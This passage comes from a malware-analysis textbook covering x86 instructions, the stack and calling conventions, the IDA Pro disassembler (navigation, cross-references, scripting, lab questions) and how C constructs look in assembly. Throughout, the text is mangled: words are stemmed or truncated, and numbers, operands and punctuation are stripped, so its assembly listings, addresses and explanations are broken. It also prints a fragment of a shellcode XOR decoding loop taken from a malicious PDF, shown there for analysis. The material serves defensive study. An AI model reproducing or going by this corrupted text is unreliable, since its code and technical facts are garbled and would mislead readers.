ebx howev mov instruct like invalid figur show valu regist eax ebx left inform contain memori right ebx set xb address xb valu x instruct mov eax ebx place valu x obtain memori eax instruct lea eax ebx place valu xb eaxfigur ebx regist use access memori lea instruct use exclus refer memori address use calcul valu requir fewer instruct exampl common see instruct lea ebx eax eax number rather memori address instruct function equival ebx eax former shorter effici compil use instead total four instruct exampl inc eax mov ecx mul ecx mov ebx eax arithmet x assembl includ mani instruct arithmet rang basic addit subtract logic oper well cover commonli use instruct section addit subtract add subtract valu destin operand format addit instruct add destin valu format subtract instruct sub destin valu sub instruct modifi two import flag zero flag zf carri flag cf zf set result zero cf set destin less valu subtract inc dec instruct increment decrement regist one tabl show exampl addit subtract instruct tabl addit subtract instruct exampl instruct descript sub eax x subtract x eax add eax ebx add ebx eax store result eax inc edx increment edx dec ecx decrement ecx multipl divis act predefin regist command simpli instruct plu valu regist multipli divid format mul instruct mul valu similarli format div instruct div valu assign regist mul div instruct act occur mani instruct earlier might need search program find mul valu instruct alway multipli eax valu therefor eax must set appropri multipl occur result store bit valu across two regist edx eax edx store signific bit oper eax store least signific bit figur depict valu edx eax decim result multipl larg fit singl regist div valu instruct thing mul except opposit direct divid bit across edx eax valu therefor edx eax regist must set appropri divis occur result divis oper store eax remaind store edx figur multipl result store across edx eax regist programm obtain remaind divis oper use oper known modulo compil assembl use edx regist div instruct sinc contain remaind tabl show exampl mul div instruct instruct imul idiv sign version mul div instruct tabl multipl divis instruct exampl instruct descriptionmul x multipli eax x store result edxeax div x divid edxeax x store result eax remaind edx logic oper xor use x architectur correspond instruct oper similar add sub oper perform specifi oper sourc destin operand store result destin xor instruct frequent encount disassembl exampl xor eax eax quick way set eax regist zero done optim instruct requir byte wherea mov eax requir byte shr shl instruct use shift regist format shr instruct shr destin count shl instruct format shr shl instruct shift bit destin operand right left respect number bit specifi count operand bit shift beyond destin boundari first shift cf flag zero bit fill shift exampl binari valu shift right result end shift instruct cf flag contain last bit shift destin operand rotat instruct ror rol similar shift instruct except shift bit fall shift oper rotat end word right rotat ror least signific bit rotat signific posit left rotat rol exact opposit tabl display exampl instruct tabl common logic shift arithmet instruct instruct descript xor eax eax clear eax regist eax x perform logic oper eax x mov eax xa shl shift eax regist left bit two instruct result eax x xa binari shift bit left xeax mov bl xa ror bl rotat bl regist right bit two instruct result bl rotat bit right shift often use place multipl optim shift simpler faster multipl dont need set regist move data around multipl shl eax instruct comput result multipli eax two shift left two bit posit multipli operand four shift left three bit posit multipli operand eight shift operand left n bit multipli n malwar analysi encount function contain instruct xor shl ror shr rol repeatedli seemingli randomli probabl encount encrypt compress function dont get bog tri analyz instruct unless realli need instead best bet case mark encrypt routin move nop final simpl instruct nop noth issu execut simpli proce next instruct instruct nop actual pseudonym xhcg eax eax sinc exchang eax noth popularli refer nop oper opcod instruct x commonli use nop sled buffer overflow attack attack dont perfect control exploit provid execut pad reduc risk malici shellcod start execut middl therefor malfunct discuss nop sled shellcod depth chapter stack memori function local variabl flow control store stack data structur character push pop push item onto stack pop item stack last first lifo structurefor exampl push number order first item pop last item push onto stack x architectur builtin support stack mechan regist support includ esp ebp regist esp stack pointer typic contain memori address point top stack valu regist chang item push pop stack ebp base pointer stay consist within given function program use placehold keep track locat local variabl paramet stack instruct includ push pop call leav enter ret stack alloc topdown format memori highest address alloc use first valu push onto stack smaller address use illustr bit later figur stack use shortterm storag frequent store local variabl paramet return address primari usag manag data exchang function call implement manag vari among compil common convent local variabl paramet referenc rel ebp function call function portion code within program perform specif task rel independ remain code main code call temporarili transfer execut function return main code stack util program consist throughout given binari focu common convent known cdecl chapter explor altern mani function contain prologu line code start function prologu prepar stack regist use within function vein epilogu end function restor stack regist state function call follow list summar flow common implement function call bit later figur show diagram stack layout individu stack frame clarifi organ stack argument place stack use push instruct function call use call memoryloc caus current instruct address content eip regist push onto stack address use return main code function finish function begin eip set memoryloc start function use function prologu space alloc stack local variabl ebp base pointer push onto stack done save ebp call function function perform work use function epilogu stack restor esp adjust free local variabl ebp restor call function address variabl properli leav instruct use epilogu set esp equal ebp pop ebp stack function return call ret instruct pop return address stack eip program continu execut origin call made stack adjust remov argument sent unless theyll use later stack layout discuss stack alloc topdown fashion higher memori address use first figur show stack laid memori time call perform new stack frame gener function maintain stack frame return time caller stack frame restor execut transfer back call functionfigur x stack layout figur show dissect one individu stack frame figur memori locat individu item also display diagram esp would point top stack memori address xfc ebp would set xfc throughout durat function local variabl argument referenc use ebp argument push onto stack call shown bottom stack frame next contain return address put stack automat call instruct old ebp next stack ebp caller stack frame inform push onto stack esp decreas exampl figur instruct push eax execut esp would decrement four would contain xf data contain eax would copi xf instruct pop ebx execut data xf would move ebx regist esp would increment fourfigur individu stack frame possibl read data stack without use push pop instruct exampl instruct mov eax ssesp directli access top stack ident pop eax except esp regist impact convent use depend compil compil configur discuss detail chapter x architectur provid addit instruct pop push popular pusha pushad instruct push regist onto stack commonli use popa popad pop regist stack pusha pushad function oper follow pusha push bit regist stack follow order ax cx dx bx sp bp si di pushad push bit regist stack follow order eax ecx edx ebx esp ebp esi edi instruct typic encount shellcod someon want tosav current state regist stack restor later time compil rare use instruct see often indic someon handcod assembl andor shellcod condit program languag abil make comparison make decis base comparison condit instruct perform comparison two popular condit instruct test cmp test instruct ident instruct howev operand involv modifi instruct test instruct set flag zero flag zf typic flag interest test instruct test someth often use check null valu exampl test eax eax could also compar eax zero test eax eax use fewer byte fewer cpu cycl cmp instruct ident sub instruct howev operand affect cmp instruct use set flag zero flag carri flag cf may chang result cmp instruct tabl show cmp instruct impact flag tabl cmp instruct flag cmp dst src zf cf dst src dst src dst src branch branch sequenc code condit execut depend flow program term branch use describ control flow branch program popular way branch occur jump instruct extens set jump instruct use jmp instruct simplest theformat jmp locat caus next instruct execut one specifi jmp known uncondit jump execut alway transfer target locat simpl jump satisfi branch need exampl logic equival statement isnt possibl jmp statement assembl code condit jump come condit jump use flag determin whether jump proceed next instruct differ type condit jump use small set commonli encount tabl show common condit jump instruct detail oper jcc shorthand gener describ condit jump tabl condit jump instruct descript jz loc jump specifi locat zf jnz loc jump specifi locat zf je loc jz commonli use cmp instruct jump occur destin operand equal sourc operand jne loc jnz commonli use cmp jump occur destin operand equal sourc operand jg loc perform sign comparison jump cmp destin operand greater sourc operand jge loc perform sign comparison jump cmp destin operand greater equal sourc operand ja loc jg unsign comparison perform jae loc jge unsign comparison perform jl loc perform sign comparison jump cmp destin operand less sourc operand jle loc perform sign comparison jump cmp destin operand less equal sourc operand jb loc jl unsign comparison performedjb loc jle unsign comparison perform jo loc jump previou instruct set overflow flag js loc jump sign flag set sf jecxz loc jump locat ecx rep instruct rep instruct set instruct manipul data buffer usual form array byte also singl doubl word focu array byte section intel refer instruct string instruct wont use term avoid confus string discuss chapter common data buffer manipul instruct mov x cmp x sto x sca x x b w byte word doubl word respect instruct work type data focu section byte use movsb cmpsb esi edi regist use oper esi sourc index regist edi destin index regist ecx use count variabl instruct requir prefix oper data length greater movsb instruct move singl byte util ecx regist x repeat prefix use multibyt oper rep instruct increment esi edi offset decrement ecx regist rep prefix continu ecx repe repz repn repnz prefix continu ecx zf illustr tabl therefor data buffer manipul instruct esi edi ecx must properli initi rep instruct use tabl rep instruct termin requir instruct descriptionrep repeat ecx repe repz repeat ecx zf repn repnz repeat ecx zf movsb instruct use move sequenc byte one locat anoth rep prefix commonli use movsb copi sequenc byte size defin ecx rep movsb instruct logic equival c memcpi function movsb instruct grab byte address esi store address edi increment decrement esi edi regist one accord set direct flag df df increment otherwis decrement rare see compil c code shellcod peopl sometim flip direct flag store data revers direct rep prefix present ecx check see contain zero instruct move byte esi edi decrement ecx regist process repeat ecx cmpsb instruct use compar two sequenc byte determin whether contain data cmpsb instruct subtract valu locat edi valu esi updat flag typic use repe prefix coupl repe prefix cmpsb instruct compar byte two sequenc find differ sequenc reach end comparison cmpsb instruct obtain byte address esi compar valu locat edi set flag increment esi edi regist one repe prefix present ecx check flag also check ecx zf oper stop repeat equival c function memcmp scasb instruct use search singl valu sequenc byte valu defin al regist work way cmpsb compar byte locat address esi al rather edi repe oper continu byte found ecx valu found sequenc byte esi store locat valu stosb instruct use store valu locat specifi edi ident scasb instead search specifi byte place inth locat specifi edi rep prefix use scasb initi buffer memori wherein everi byte contain valu equival c function memset tabl display common rep instruct describ oper tabl rep instruct exampl instruct descript repe cmpsb use compar two data buffer edi esi must set two buffer locat ecx must set buffer length comparison continu ecx buffer equal rep stosb use initi byte buffer certain valu edi contain buffer locat al must contain initi valu instruct often seen use xor eax eax rep movsb typic use copi buffer byte esi must set sourc buffer address edi must set destin buffer address ecx must contain length copi bytebybyt copi continu ecx repn scasb use search data buffer singl byte edi must contain address buffer al must contain byte look ecx must set buffer length comparison continu ecx byte found c main method offset malwar often written c import know main method c program translat assembl knowledg also help understand offset differ go c code assembl standard c program two argument main method typic form int mainint argc char argv paramet argc argv determin runtim argc paramet integ contain number argument command line includ program name argv paramet pointer array string contain commandlin argument follow exampl show command line program result argc argv program run filetestprogramex r filenametxtargc argv filetestprogramex argv r argv filenametxt exampl show c code simpl program exampl c code main method exampl int mainint argc char argv argc return strncmpargv r deletefileaargv return exampl show c code exampl compil form exampl help understand paramet list tabl access assembl code argc compar argv compar r use strncmp notic argv access first locat begin array load eax offset ad eax get argv number use entri argv array address string address byte size bit system r provid command line code start execut see argv access offset rel argv provid argument deletefilea function exampl assembl code c main method paramet ce cmp ebp argc jz short locd xor eax eax jmp short loc mov esi esp da push maxcount dc push offset str r e mov eax ebp argv e mov ecx eax e push ecx str e call strncmp f test eax eax fa jnz short loc fc mov esi esp fe mov eax ebp argv mov ecx eax push ecx lpfilenam call deletefilea inform intel x architectur manual encount instruct never seen cant find answer googl search download complet x architectur manual intel httpwwwintelcomproductsprocessormanualsindexhtm set includ follow volum basic architectur manual describ architectur program environ use help understand memori work includ regist memori layout address stack manual also contain detail gener instruct group volum instruct set refer volum b instruct set refer nz use manual malwar analyst alphabet entir instruct set discuss everi aspect instruct includ format instruct opcod inform instruct impact system volum system program guid part volum b system program guid part ii addit generalpurpos regist x mani specialpurpos regist instruct impact execut support os includ debug memori manag protect task manag interrupt except handl multiprocessor support encount specialpurpos regist refer system program guid see impact execut optim refer manual manual describ codeoptim techniqu applic offer addit insight code gener compil mani good exampl instruct use unconvent waysconclus work knowledg assembl disassembl process key becom success malwar analyst chapter laid foundat import x concept encount disassembl malwar use refer encount unfamiliar instruct regist perform analysi throughout book chapter build chapter give wellround assembl foundat real way get good disassembl practic next chapter well take look ida pro tool greatli aid analysi disassemblychapt ida pro interact disassembl profession ida pro extrem power disassembl distribut hexray although ida pro disassembl disassembl choic mani malwar analyst revers engin vulner analyst two version ida pro commerci avail version support x advanc version support mani processor standard version notabl x ida pro also support sever file format portabl execut pe common object file format coff execut link format elf aout well focu discuss x x architectur pe file format throughout book cover commerci version ida pro download free version ida pro ida pro free httpwwwhex rayscomidaproidadownfreewarehtm version limit function write stuck version use ida pro free seriou disassembl consid tri would like play ida ida pro disassembl entir program perform task function discoveri stack analysi local variabl identif much chapter discuss task bring closer sourc code ida pro includ extens code signatur within fast librari identif recognit technolog flirt allow recogn label disassembl function especi librari code ad compil ida pro meant interact aspect disassembl process modifi manipul rearrang redefin one best aspect ida pro abil save analysi progress add comment label data name function save work ida pro databas known idb return later ida pro also robust support plugin write extens leverag work other chapter give solid introduct use ida pro malwar analysi dig deeper ida pro chri eagl ida pro book theunoffici guid world popular disassembl nd edit starch press consid best avail resourc make great desktop refer ida pro revers gener load execut figur display first step load execut ida pro load execut ida pro tri recogn file format processor architectur exampl file recogn pe format intel x architectur unless perform malwar analysi cell phone malwar probabl wont need modifi processor type often cell phone malwar often creat variou platform load file ida pro pe file program map file memori load oper system loader ida pro disassembl file raw binari choos binari file option top box shown option prove use malwar sometim append shellcod addit data encrypt paramet even addit execut legitim pe file extra data wont load memori malwar run window load ida pro addit load raw binari file contain shellcod choos load file binari file disassembl pe file compil load prefer base address memori window loader cant load prefer address address alreadi taken loader perform oper known rebas often happen dll sinc often load locat differ prefer address cover rebas depth chapter know encount dll load process differ see ida pro could result file rebas occur check manual load checkbox shown figur youll see input box specifi new virtual base address load filefigur load file ida pro default ida pro includ pe header resourc section disassembl place malwar often hide malici code specifi manual load ida pro ask want load section one one includ pe file header section wont escap analysisth ida pro interfac load program ida pro see disassembl window shown figur primari space manipul analyz binari assembl code resid disassembl window mode display disassembl window one two mode graph default shown figur text switch mode press spacebar graph mode graph mode ida pro exclud certain inform recommend display line number oper code chang option select option gener select line prefix set number opcod byte instruct contain fewer byte set allow see memori locat opcod valu instruct code list set make everyth scroll screen right tri set instruct indent figur graph mode ida pro disassembl windowin graph mode color direct arrow help show program flow analysi arrow color tell whether path base particular decis made red condit jump taken green jump taken blue uncondit jump arrow direct show program flow upward arrow typic denot loop situat highlight text graph mode highlight everi instanc text disassembl window text mode text mode disassembl window tradit view must use view data region binari figur display text mode view disassembl function display memori address b section name text opcod ec resid memori left portion textmod display known arrow window show program nonlinear flow solid line mark uncondit jump dash line mark condit jump arrow face indic loop exampl includ stack layout function comment begin semicolon automat ad ida pro note still learn assembl code find auto comment featur ida pro use turn featur select option gener check auto comment checkbox add addit comment throughout disassembl window aid analysisfigur text mode ida pro disassembl window use window analysi sever ida pro window highlight particular item execut follow signific purpos function window list function execut show length sort function length filter larg complic function like interest exclud tini function process window also associ flag function f l use l indic librari function l flag save time analysi identifi skip compilergener function name window list everi address name includ function name code name data string string window show string default list show ascii string longer five charact chang rightclick string window select setup import window list import file export window list export function file window use your analyz dll structur window list layout activ data structur window also provid abil creat data structur use memori layout templat window also offer crossrefer featur particularli use locat interest code exampl find code locat call import function could use import window doubleclick import function interest use crossrefer featur locat import call code list return default view ida pro interfac rich press key click someth may find imposs navig return default view choos window reset desktop choos option wont undo label disassembl youv done simpli restor window gui element default token youv modifi window like see save new view select window save desktop navig ida pro note ida pro tricki navig mani window link disassembl window exampl doubleclick entri within import window string window take directli entri use link crossrefer anoth way navig ida pro use link within disassembl window link shown exampl doubleclick link display target locat disassembl window exampl navig link within disassembl window jnz short loce mov ebpvar e loce code xref subj cmp ebpvarc jnz short loc mov eax ebpvar mov esphvar eax b mov esphvar offset aprintnumberd print number dn call printf call suba follow common type link sub link link start function printf suba loc link link jump destin loce loc offset link link offset memori crossrefer shown list use jump display referenc locat x exampl string typic refer also navig link exampl aprintnumberd use jump display string defin memori explor histori ida pro forward back button shown figur make easi move histori would move histori web page browser time navig new locat within disassembl window locat ad histori figur navig button navig band horizont color band base toolbar navig band present colorcod linear view load binari address space color offer insight file content locat file follow light blue librari code recogn flirt red compilergener codedark blue userwritten code perform malwar analysi darkblu region start get lost messi code navig band help get back track ida pro default color data pink import gray defin data brown undefin data note older version ida pro flirt signatur may date end lot librari code darkblu region flirt isnt perfect sometim wont recogn label librari code properli jump locat jump virtual memori address simpli press g key keyboard disassembl window dialog box appear ask virtual memori address name locat sub printf jump raw file offset choos jump jump file offset exampl your view pe file hex editor see someth interest string shellcod use featur get raw offset file load ida pro map though load os loader search select search top menu display mani option move cursor disassembl window choos search next code move cursor next locat contain instruct specifi choos search text search entir disassembl window specif string choos search sequenc byte perform binari search hex view window certain byte order option use your search specif data opcod combin follow exampl display commandlin analysi passwordexebinari malwar requir password continu run see print string bad key enter invalid password test c passwordex enter password malwar test bad key pull binari ida pro see use search featur link unlock program begin search occurr bad key string shown figur notic bad key use x jump locat disassembl window doubl click entri search window figur search exampl disassembl list around locat x shown next look list bad keyn see comparison xf test result strcmp one paramet strcmp string like password mab e push offset amab mab e lea ecx ebpvarc e push ecx e call strcmp ee add esp f test eax eax f jnz short loc f push offset akeyaccept key acceptedn fa call printf ff add esp jmp short loc loc code xref mainj push offset abadkey bad keyn call printf next exampl show result enter password discov mab program print differ result c passwordex enter password malwar mab key accept malwar unlockedthi exampl demonstr quickli use search featur link get inform binaryus crossrefer crossrefer known xref ida pro tell function call string use identifi use function want know paramet call use crossrefer navig quickli locat paramet place stack interest graph also gener base crossrefer help perform analysi code crossrefer exampl show code crossrefer tell us function sub call insid main function offset x main function code crossrefer jump tell us jump take us locat exampl correspond locat mark know offset x sub jmp memori address x exampl code crossrefer sub proc near code xref mainp push ebp mov ebp esp loc code xref subj mov eax test eax eax jz short locb c push offset aloop loopn call printf add esp jmp short loc default ida pro show coupl crossrefer given function even though mani may occur function call view crossrefer function click function name press x keyboard window pop list locat function call bottom xref window figur show list crossrefer sub see function call time line figur xref window doubleclick entri xref window go correspond refer disassembl window data crossrefer data crossrefer use track way data access within binari data refer associ byte data referenc code via memori refer shown exampl exampl see data crossrefer dword xf correspond cross refer tell us data use function locat x follow line show data crossrefer string hostnam port exampl data crossrefer c dwordc dd fh data xref subr c ahostnameport db hostnam portah data xref subo recal chapter static analysi string often use start point analysi see interest string use ida pro crossrefer featur see exactli string use within codeanalyz function one power aspect ida pro abil recogn function label break local variabl paramet exampl show exampl function recogn ida pro exampl function stack exampl u b r u n e attribut ebpbas frame function proc near code xref maincp var c dword ptr ch var dword ptr var dword ptr arg dword ptr arg dword ptr ch push ebp mov ebp esp sub esp ch mov ebpvar mov ebpvarc mov eax ebpvar add eax h mov ebparg eax cmp ebparg h jnz short locb mov ecx ebparg mov ebpvar ecx jmp short loc b locb code xref functionj b call sub loc code xref functionj mov eax ebparg mov esp ebp pop ebp retn function endp notic ida pro tell us ebpbas stack frame use function mean local variabl paramet referenc via ebp regist throughout function ida pro success discov local variabl paramet function label local variabl prefix var paramet prefix arg name local variabl paramet suffix correspond offset rel ebp ida pro label local variabl paramet use thecod way know automat found everyth origin sourc code recal discuss chapter local variabl neg offset rel ebp argument posit offset see ida pro suppli start summari stack view first line summari tell us varc correspond valu xch ida pro way tell us substitut varc xc abstract instruct exampl instead need read instruct mov ebpch simpli read varc set continu analysi abstract make read disassembl effici sometim ida pro fail identifi function happen creat function press p may also fail identifi ebpbas stack frame instruct mov ebpch eax push dword ptr ebph might appear instead conveni label case fix press alt p select bp base frame specifi byte save regist use graph option ida pro support five graph option access button toolbar shown figur four graph option util crossrefer figur graph button toolbar click one button toolbar present graph via applic call wingraph unlik graph view disassembl window graph manipul ida often refer legaci graph option graph button toolbar describ tabl tabl graph option button function descript creat flow chart current function user prefer use interact graph mode disassembl window may use button time see altern graph view well use option graph code chapter graph function call entir program use gain quick understand hierarchi function call made within program shown figur dig deeper use wingraph zoom featur find graph larg static link execut becom clutter graph unus graph cross refer get current select cross refer use see reach certain identifi also use function help see differ path program take reach particular function graph cross refer use way see seri function call exampl figur display type graph singl function notic subf call sub call gethostbynam view quickli tell function function docurr select symbol underneath easiest way get quick overview function graph userspecifi cross refer graph use option build custom graph specifi graph recurs depth symbol use symbol type node exclud graph way modifi graph gener ida pro display wingraph figur crossrefer graph program figur crossrefer graph singl function subf enhanc disassembl one ida pro best featur allow modifi disassembl suit goal chang make greatli increas speed analyz binari warn ida pro undo featur care make chang renam locat ida pro good job automat name virtual address stack variabl also modifi name make meaning autogener name also known dummi name sub dont tell much function name reversebackdoorthread would lot use renam dummi name someth meaning also help ensur reverseengin function renam dummi name need one place ida pro propag new name wherev item referenc youv renam dummi name someth meaning cross refer becom much easier pars exampl function sub call mani time throughout program renam dnsrequest renam dnsrequest throughout program imagin much time save analysi read meaning name instead need revers function rememb sub tabl show exampl might renam local variabl argument left column contain assembl list argument renam right column show list argument renam actual glean inform column right renam arg portstr var port see renam element much meaning dummi namescom ida pro let emb comment throughout disassembl add mani comment automat add comment place cursor line disassembl press colon key keyboard bring comment window insert repeat comment echo across disassembl window whenev crossrefer address ad comment press semicolon key format operand disassembl ida pro make decis regard format operand instruct disassembl unless context data display typic format hex valu ida pro allow chang data need make understand tabl function operand manipul without renam argument renam argument c mov eax ebp arg cb push eax cc call atoi add esp mov ebp var ax db movzx ecx ebp var e test ecx ecx e jnz short locf e push offset aerror eb call printf f add esp f jmp locfb f f f locf f movzx edx ebp var ff push edx call dshton c mov eax ebp portstr cb push eax cc call atoi add esp mov ebp port ax db movzx ecx ebp port e test ecx ecx e jnz short locf e push offset aerror eb call printf f add esp f jmp locfb f f f locf f movzx edx ebp port ff push edx call dshton figur show exampl modifi operand instruct h compar local variabl var rightclick h would present option chang h decim octalb binari charact b asciiwhatev suit need situat figur function operand manipul chang whether operand refer memori stay data press key keyboard exampl suppos your analyz disassembl link loc trace link back see follow instruct mov eax loc add ebx eax mul ebx assembl level everyth number ida pro mislabel number x hex refer address correct mistak press key chang address number h remov offend crossrefer disassembl window use name constant malwar author programm gener often use name constant genericread sourc code name constant provid easili rememb name programm implement integ binari unfortun compil done sourc code longer possibl determin whether sourc use symbol constant liter fortun ida pro provid larg catalog name constant window api c standard librari use use standard symbol constant option shown figur operand disassembl figur show window appear select use standard symbol constant valu x figur standard symbol constant window code snippet tabl show effect appli standard symbol constant window api call createfilea note much meaning code right note determin valu choos often extens list provid standard symbol constant window need go msdn page window api call see symbol constant associ paramet discuss chapter discuss window concept sometim particular standard symbol constant want appear need load relev type librari manual select view open subview type librari view current load librari normal mssdk vcwin automat load load manual often necessari malwar use nativ api window nt famili api get symbol constant nativ api load ntapi microsoft window nt nativ api vein analyz linux binari may need manual load gnuunx gnu c unix librariest code standard symbol constant symbol constant symbol constant mov esi espchargv mov edx esi mov edi dscreatefilea push htemplatefil push h dwflagsandattribut push dwcreationdisposit push lpsecurityattribut push dwsharemod push h dwdesiredaccess push edx lpfilenam call edi createfilea mov esi espchargv mov edx esi mov edi dscreatefilea push null htemplatefil push fileattributenorm dwflagsandattribut push openexist dwcreationdisposit push null lpsecurityattribut push fileshareread dwsharemod push genericread dwdesiredaccess push edx lpfilenam call edi createfilea redefin code data ida pro perform initi disassembl program byte occasion categor incorrectli code may defin data data defin code common way redefin code disassembl window press u key undefin function code data undefin code underli byte reformat list raw byte defin raw byte code press c exampl tabl show malici pdf document name paycutspdf offset x file discov shellcod defin raw byte press c locat disassembl shellcod allow us discov contain xor decod loop x depend goal similarli defin raw byte data ascii string press respectivelyextend ida plugin extend function ida pro sever way typic via script facil potenti use script infinit rang simpl code markup complic function perform differ comparison ida pro databas file well give tast two popular way script use idc python script idc python script run easili file choos file script file individu command select file idc command file python command shown figur output window bottom workspac contain log view extens use plugin debug statu messag figur option load idc python script tabl manual disassembl shellcod paycutspdf document file press c file press c db h db fch n db h db db h db fch n db h nop nop mov ebx eax b add ebx h h db h db bh db dh b db h c db ch db h e db h f db db bh db bh db bh db h db ch db h db h db h db h c db h db h b db fh c db db e db f db db h u db fh db ch db ch db bh db e add dword ptr ebx bh mov ebx ebx xor ecx ecx loc code xref segaj xor byte ptr ebx h inc ebx inc ecx cmp ecx h jnz short loc retn bch db h db bh db fh h db bh db fh use idc script ida pro builtin script languag known idc predat widespread popular script languag python rubi idc subdirectori within ida instal directori contain sever sampl idc script ida pro use analyz disassembl text refer program want learn idc idc script program made function function declar static argument dont need type specifi auto use defin local variabl idc mani builtin function describ ida pro help index idcidc file typic includ script use builtin function chapter discuss peid tool plugin krypto analyz kanal export idc script idc script set bookmark comment ida pro databas given binari shown exampl exampl idc script gener peid kanal plugin includ idcidc static mainvoid auto slotidx slotidx markpositionx slotidx rijndael char makecommprevnottailx rijndael charnrijndael ae sbox also use cipher markpositionx slotidx rijndael sinv char makecommprevnottailx rijndael sinv charnrijndael ae invers sbox decrypt load idc script select file script file idc script execut immedi toolbar window open one button edit anoth reexecut script need use idapython idapython fulli integr current version ida pro bring power conveni python script binari analysi idapython exposesa signific portion ida pro sdk function allow far power script offer idc idapython three modul provid access ida api idaapi idc interfac idc idapython util function idautil idapython script program use effect address ea perform primari method referenc abstract data type call take either ea symbol name string idapython mani wrapper function around core idc function exampl show sampl idapython script goal script color code call instruct idb make stand analyst exampl screenea common function get locat cursor head function use walk defin element instruct case weve collect function call functioncal iter instruct use setcolor set color exampl use python script color function call idautil import idc import head head segstart screenea segend screenea functioncal head getmnemi call functioncal appendi print number call found len functioncal functioncal setcolor cicitem xcfdff use commerci plugin gain solid experi ida pro consid purchas commerci plugin hexray decompil zynam bindiff hexray decompil use plugin convert ida pro disassembl humanread clike pseudocod text read clike code instead disassembl often speed analysi get closer origin sourc code malwar author wrotezynam bindiff use tool compar two ida pro databas allow pinpoint differ malwar variant includ new function differ similar function one featur abil provid similar rate your compar two piec malwar describ ida pro extens extens appendix b conclus chapter offer cursori exposur ida pro throughout book use ida pro lab demonstr interest way use youv seen ida pro abil view disassembl one small aspect power ida pro true power come interact abil weve discuss way use mark disassembl help perform analysi weve also discuss way use ida pro brows assembl code includ navig brows util power crossrefer view graph speed analysi processlab lab analyz malwar found file labdll use ida pro goal lab give handson experi ida pro youv alreadi work ida pro may choos ignor question focu reverseengin malwar question q address dllmain q use import window brows gethostbynam import locat q mani function call gethostbynam q focus call gethostbynam locat x figur dn request made q mani local variabl ida pro recogn subroutin x q mani paramet ida pro recogn subroutin x q use string window locat string cmdex c disassembl locat q happen area code refer cmdex c q area xc look like dwordec global variabl help decid path take malwar set dwordec hint use dwordec crossrefer q hundr line subroutin xff seri comparison use memcmp compar string happen string comparison robotwork success memcmp return q export pslist q use graph mode graph crossrefer sube api function could call enter function base api function alon could renam function q mani window api function dllmain call directli mani depth q x call sleep api function take one paramet containingth number millisecond sleep look backward code long program sleep code execut q x call socket three paramet q use msdn page socket name symbol constant function ida pro make paramet meaning paramet appli chang q search usag instruct opcod xed instruct use magic string vmxh perform vmware detect use malwar use crossrefer function execut instruct evid vmware detect q jump cursor xd find q ida python plugin instal includ commerci version ida pro run labpi ida pro python script provid malwar book make sure cursor xd happen run script q cursor locat turn data singl ascii string q open script text editor workchapt recogn c code construct assembl chapter review x architectur common instruct success revers engin evalu instruct individu unless must process tediou instruct entir disassembl program number thousand even million malwar analyst must abl obtain highlevel pictur code function analyz instruct group focus individu instruct need skill take time develop let begin think malwar author develop code determin group instruct malwar typic develop use highlevel languag commonli c code construct code abstract level defin function properti detail implement exampl code construct includ loop statement link list switch statement program broken individu construct combin implement overal function program chapter design start way discuss ten differ c code construct well examin construct assembl although purpos chapter assist revers goal malwar analyst go disassembl highlevel construct learn revers direct often easier comput programm accustom read understand sourc code chapter focu common difficult construct loop condit statement compil youv built foundat youll learn develop highlevel pictur code function quickli addit discuss differ construct well also examin differ compil compil version set impact particular construct appear disassembl well evalu two differ way switch statement function call compil use differ compilersthi chapter dig fairli deepli c code construct understand c program gener youll get help c languag look classic c program languag brian kernighan denni ritchi prenticehal malwar written c although sometim written delphi c c simpl languag close relationship assembl logic place new malwar analyst start read chapter rememb goal understand overal function program analyz everi singl instruct keep mind dont get bog minutia focu way program work gener particular thing global vs local variabl global variabl access use function program local variabl access function defin global local variabl declar similarli c look complet differ assembl follow two exampl c code global local variabl notic subtl differ two global exampl exampl defin x variabl outsid function local exampl exampl variabl defin within function exampl simpl program two global variabl int x int void main x xy printftot dn x exampl simpl program two local variabl void main int x int x xy printftot dn x differ global local variabl c code exampl small case program result disassembl shown exampl exampl quit differ global variabl referenc memori address local variabl referenc stack address exampl global variabl x signifi dwordcf memori locat xcf notic x chang memori eax move dwordcf subsequ function util variabl impact exampl assembl code global variabl exampl exampl mov eax dwordcf add eax dwordc e mov dwordcf eax mov ecx dwordcf push ecx push offset atotald total dn f call printf exampl exampl local variabl x locat stack constant offset rel ebp exampl memori locat ebp use consist throughout function refer local variabl x tell us ebp stackbas local variabl referenc function defin exampl assembl code local variabl exampl exampl without label mov dword ptr ebp mov dword ptr ebp mov eax ebp add eax ebp mov ebp eax mov ecx ebp push ecx push offset atotald total dn call printf exampl x nice label ida pro disassembl dummi name var discuss chapter dummi name renam meaning name reflect function local variabl name var instead simplifi analysi renam var x wont need track offset head throughout thefunct exampl assembl code local variabl exampl shown exampl label mov ebp var mov ebpvar mov eax ebp var add eax ebpvar mov ebp var eax mov ecx ebp var push ecx push offset atotald total dn call printfdisassembl arithmet oper mani differ type math oper perform c program well present disassembl oper section exampl show c code two variabl varieti arithmet oper two oper use decrement increment respect oper perform modulo two variabl remaind perform divis oper exampl c code two variabl varieti arithmet int int b b b b exampl show assembl c code shown exampl broken translat back c exampl assembl code arithmet exampl exampl mov ebpvar mov ebpvar mov eax ebpvar add eax bh mov ebpvar eax mov ecx ebpvar sub ecx ebpvar mov ebpvar ecx mov edx ebpvar sub edx c mov ebpvar edx f mov eax ebpvar add eax mov ebpvar eax mov eax ebpvar b cdq c mov ecx idiv ecx mov ebpvar edx exampl b local variabl referenc stack ida pro label var b var first var var initi respect move eax xb addedto eax therebi increment b subtract compil decid use sub add instruct instead inc dec function final five assembl instruct implement modulo perform div idiv instruct divid edxeax operand store result eax remaind edx edx move var recogn statement programm use statement alter program execut base certain condit statement common c code disassembl well examin basic nest statement section goal learn recogn differ type statement exampl display simpl statement c assembl code shown exampl notic condit jump jnz must condit jump statement condit jump correspond statement exampl c code statement exampl int x int ifx printfx equal yn els printfx equal yn exampl assembl code statement exampl exampl mov ebpvar mov ebpvar mov eax ebpvar cmp eax ebpvar jnz short locb c push offset axequalsi x equal yn call printf add esp jmp short loc b locb b push offset axisnotequaltoy x equal yn call printf see exampl decis must made code insid statement exampl execut decis correspond condit jump jnz shown decis jump made base comparison cmp check see var equal var var var correspond x sourc code valu equal jump occur code print x equal otherwis code continu path execut print x equal notic also jump jmp jump els section code isimport recogn one two code path taken analyz function graphic ida pro ida pro graph tool use recogn construct shown figur featur default view analyz function figur show graph assembl code exampl exampl see two differ path code execut lead end function path print differ string code path print x equal print x equal ida pro add fals true label decis point bottom upper code box imagin graph function greatli speed reverseengin process recogn nest statement exampl show c code nest statement similar exampl except two addit statement ad within origin statement addit statement test determin whether z equal exampl c code nest statement int x int int z ifx ifz printfz zero x yn els printfz nonzero x yn els ifz printfz zero x yn els printfz 